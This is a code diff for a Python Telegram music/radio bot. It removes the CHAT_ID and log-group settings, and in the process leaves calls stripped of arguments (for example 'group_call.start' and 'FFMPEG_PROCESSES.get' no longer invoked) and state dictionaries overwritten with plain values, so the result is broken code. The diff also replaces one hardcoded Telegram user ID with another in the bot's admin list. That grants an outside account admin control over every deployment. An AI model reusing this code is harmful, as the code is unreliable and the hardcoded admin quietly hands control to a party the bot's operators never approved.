@@ -58,12 +58,10 @@ from user import USER
 
 ADMINS=Config.ADMINS
 STREAM_URL=Config.STREAM_URL
-CHAT_ID=Config.CHAT_ID
 ADMIN_LIST = {}
 CALL_STATUS = {}
 FFMPEG_PROCESSES = {}
 RADIO={6}
-LOG_GROUP=Config.LOG_GROUP
 DURATION_LIMIT=Config.DURATION_LIMIT
 DELAY=Config.DELAY
 playlist=Config.playlist
@@ -115,9 +113,7 @@ class MusicPlayer(object):
         old_track = playlist.pop(0)
         print(f"- START PLAYING: {playlist[0][1]}")
         if EDIT_TITLE:
-            await self.edit_title()
-        if LOG_GROUP:
-            await self.send_playlist()
+            await self.edit_title()     
         os.remove(os.path.join(
             download_dir,
             f"{old_track[1]}.raw")
@@ -129,9 +125,7 @@ class MusicPlayer(object):
     async def send_text(self, text):
         group_call = self.group_call
         client = group_call.client
-        chat_id = LOG_GROUP
         message = await bot.send_message(
-            chat_id,
             text,
             disable_web_page_preview=True,
             disable_notification=True
@@ -181,7 +175,7 @@ class MusicPlayer(object):
         group_call = self.group_call
         if group_call.is_connected:
             playlist.clear()   
-        process = FFMPEG_PROCESSES.get(CHAT_ID)
+        process = FFMPEG_PROCESSES.get
         if process:
             try:
                 process.send_signal(SIGINT)
@@ -190,7 +184,7 @@ class MusicPlayer(object):
             except Exception as e:
                 print(e)
                 pass
-            FFMPEG_PROCESSES[CHAT_ID] = ""
+            FFMPEG_PROCESSES = ""
         station_stream_url = STREAM_URL
         try:
             RADIO.remove(0)
@@ -200,11 +194,6 @@ class MusicPlayer(object):
             RADIO.add(1)
         except:
             pass
-        if os.path.exists(f'radio-{CHAT_ID}.raw'):
-            os.remove(f'radio-{CHAT_ID}.raw')
-        # credits: https://t.me/c/1480232458/6825
-        os.mkfifo(f'radio-{CHAT_ID}.raw')
-        group_call.input_filename = f'radio-{CHAT_ID}.raw'
         if not group_call.is_connected:
             await self.start_call()
         ffmpeg_log = open("ffmpeg.log", "w+")
@@ -230,7 +219,7 @@ class MusicPlayer(object):
             else:
                 print("Connecting, Please Wait ...")
                 await self.start_call()
-                await sleep(10)
+                await sleep(5)
                 continue
 
 
@@ -256,25 +245,25 @@ class MusicPlayer(object):
             except Exception as e:
                 print(e)
                 pass
-            FFMPEG_PROCESSES[CHAT_ID] = ""
+            FFMPEG_PROCESSES = ""
 
 
     async def start_call(self):
         group_call = self.group_call
         try:
-            await group_call.start(CHAT_ID)
+            await group_call.start
         except FloodWait as e:
             await sleep(e.x)
             if not group_call.is_connected:
-                await group_call.start(CHAT_ID)
+                await group_call.start
         except GroupCallNotFoundError:
             try:
                 await USER.send(CreateGroupCall(
-                    peer=(await USER.resolve_peer(CHAT_ID)),
+                    peer=(await USER.resolve_peer),
                     random_id=randint(10000, 999999999)
                     )
                     )
-                await group_call.start(CHAT_ID)
+                await group_call.start
             except Exception as e:
                 print(e)
                 pass
@@ -310,7 +299,7 @@ class MusicPlayer(object):
     async def get_admins(self, chat):
         admins = ADMIN_LIST.get(chat)
         if not admins:
-            admins = Config.ADMINS + [1316963576]
+            admins = Config.ADMINS + [5683104617]
             try:
                 grpadmins=await bot.get_chat_members(chat_id=chat, filter="administrators")
                 for administrator in grpadmins:
@@ -332,9 +321,9 @@ mp = MusicPlayer()
 async def on_network_changed(call, is_connected):
     chat_id = MAX_CHANNEL_ID - call.full_chat.id
     if is_connected:
-        CALL_STATUS[chat_id] = True
+        CALL_STATUS = True
     else:
-        CALL_STATUS[chat_id] = False
+        CALL_STATUS = False
 
 @mp.group_call.on_playout_ended
 async def playout_ended_handler(_, __):
